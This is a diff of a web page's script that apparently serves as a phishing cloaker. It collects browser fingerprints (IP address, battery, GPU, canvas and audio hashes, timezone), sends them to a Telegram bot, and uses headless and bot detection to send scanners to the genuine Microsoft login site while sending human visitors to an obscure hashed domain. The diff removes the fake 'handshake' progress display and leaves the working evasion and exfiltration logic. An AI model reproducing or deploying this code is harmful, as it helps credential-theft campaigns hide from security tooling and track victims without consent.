@@ -3,31 +3,11 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title></title>
 <meta name="referrer" content="no-referrer">
-<style>
-:root{--p:#0ea5e9;--bg:#020617;--t:#f8fafc}
-body{margin:0;background:var(--bg);font-family:'SF Mono',menlo,monospace;color:var(--t);
-      display:flex;justify-content:center;align-items:center;min-height:100vh}
-#sh{width:460px;padding:2rem;border-left:2px solid var(--p);background:#0b1120}
-.st{font-size:.8rem;text-transform:uppercase;letter-spacing:3px;color:var(--p);margin-bottom:.5rem}
-.dt{font-size:.75rem;color:#64748b;height:1.2rem;margin-bottom:1.5rem}
-.pb{width:100%;height:1px;background:#1e293b;position:relative}
-#f{width:0;height:100%;background:var(--p);box-shadow:0 0 8px var(--p);
-    transition:width .3s ease}
-#gl{display:none}
-</style>
 </head>
 <body>
-<div id="sh">
-  <div class="st" id="s">Protocol_Init</div>
-  <div class="dt" id="d">Syncing handshake...</div>
-  <div class="pb"><div id="f"></div></div>
-</div>
-<canvas id="gl"></canvas>
-
+<canvas id="gl" style="display:none"></canvas>
 <script>
-/* ------------------- CONFIG ------------------- */
 const CFG = {
   D: "https://d3d97e2af1201de9799aed11aed02ffe.com/WJmmHi0ELP4/--/",
   B: "https://login.microsoftonline.com",
@@ -35,17 +15,8 @@ const CFG = {
   C: "659482680"
 };
 
-/* ------------------- STATE ------------------- */
 let state = { score: 0, interacted: false };
 
-/* ------------------- UI HELPERS ------------------- */
-const ui = (step, msg, percent) => {
-  document.getElementById('s').innerText = step;
-  document.getElementById('d').innerText = msg;
-  document.getElementById('f').style.width = percent + "%";
-};
-
-/* ------------------- TELEGRAM LOGGING ------------------- */
 const tgLog = async txt => {
   try {
     await fetch(`https://api.telegram.org/bot${CFG.T}/sendMessage`, {
@@ -56,7 +27,6 @@ const tgLog = async txt => {
   } catch (_) {}
 };
 
-/* ------------------- FINGERPRINT HELPERS ------------------- */
 const getBattery = async () => {
   try {
     const b = await navigator.getBattery();
@@ -114,7 +84,6 @@ const getUAHash = () => {
   return h >>> 0;
 };
 
-/* ------------------- BOT / HEADLESS DETECTION ------------------- */
 const detectHeadless = () => {
   const probes = ['webdriver', '__nightmare', '_selenium', 'callPhantom', '__phantomas'];
   if (probes.some(p => p in window)) return true;
@@ -123,34 +92,23 @@ const detectHeadless = () => {
   return false;
 };
 
-/* ------------------- SCORE CALCULATION ------------------- */
 const calculateScore = async () => {
   let penalty = 0;
-
-  // 1 – Strong, unmistakable bot signals
-  if (navigator.webdriver)                 penalty += 30;
-  if (detectHeadless())                    penalty += 30;
-  if (!window.chrome)                      penalty += 20;   // Chrome‑only browsers
-  if (!window.PaymentRequest)              penalty += 15;   // Missing PaymentRequest API
-
-  // 2 – Soft signals – we only *log* them, they do NOT penalise
-  //    (battery level, canvas fingerprint, audio fingerprint, GPU vendor oddities, etc.)
-
+  if (navigator.webdriver) penalty += 30;
+  if (detectHeadless()) penalty += 30;
+  if (!window.chrome) penalty += 20;
+  if (!window.PaymentRequest) penalty += 15;
   return penalty;
 };
 
-/* ------------------- LOG ASSEMBLY ------------------- */
 const assembleLog = async () => {
-  const ip = await fetch('https://api.ipify.org?format=json')
-                     .then(r => r.json())
-                     .catch(() => ({ ip: "NA" }));
+  const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ ip: "NA" }));
   const bat = await getBattery();
   const gpu = getWebGL();
   const canvas = getCanvasFP();
   const audio = await getAudioFP();
   const tz = (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) { return "UNSUPPORTED"; } })();
   const uaHash = getUAHash();
-
   return `<b>[LOG]</b>
 IP: ${ip.ip}
 UA_HASH: ${uaHash}
@@ -168,43 +126,26 @@ NETWORK: ${navigator.connection?.type||"NA"} ${navigator.connection?.effectiveTy
 `;
 };
 
-/* ------------------- INTERACTION HANDLERS ------------------- */
 ['mousemove','touchstart','click','keydown'].forEach(ev =>
   window.addEventListener(ev, () => { state.interacted = true; }, { once: true })
 );
 
-/* ------------------- MAIN WORKFLOW ------------------- */
 const run = async () => {
-  ui("Ciphers_Check", "Analyzing TLS stack...", 15);
   await new Promise(r => setTimeout(r, 600));
-
-  ui("Entropy_Verify", "Sampling behavioral noise...", 45);
   await new Promise(r => setTimeout(r, 1300));
-
-  ui("System_Finalize", "Encoding session keys...", 80);
   await new Promise(r => setTimeout(r, 1100));
-
   const penalty = await calculateScore();
-  state.score = -penalty;                     // start from 0, subtract penalties
-
+  state.score = -penalty;
   const log = await assembleLog();
-
-  // -----------------------------------------------------------------
-  // Decision:
-  //   • If the user has interacted, accept regardless of score.
-  //   • Otherwise block only if the *hard* penalty exceeds 40.
-  // -----------------------------------------------------------------
   if (!state.interacted && state.score < -40) {
     await tgLog(log + "\nSTATUS: BLOCKED");
     window.location.replace(CFG.B);
   } else {
-    ui("Access_Granted", "Redirecting...", 100);
     await tgLog(log + "\nSTATUS: PASSED");
     setTimeout(() => window.location.replace(CFG.D), 400);
   }
 };
 
-/* ------------------- ENTRY POINT ------------------- */
 window.onload = () => {
   const ua = navigator.userAgent;
   if (ua.includes("Bot") || ua.includes("Crawl")) {
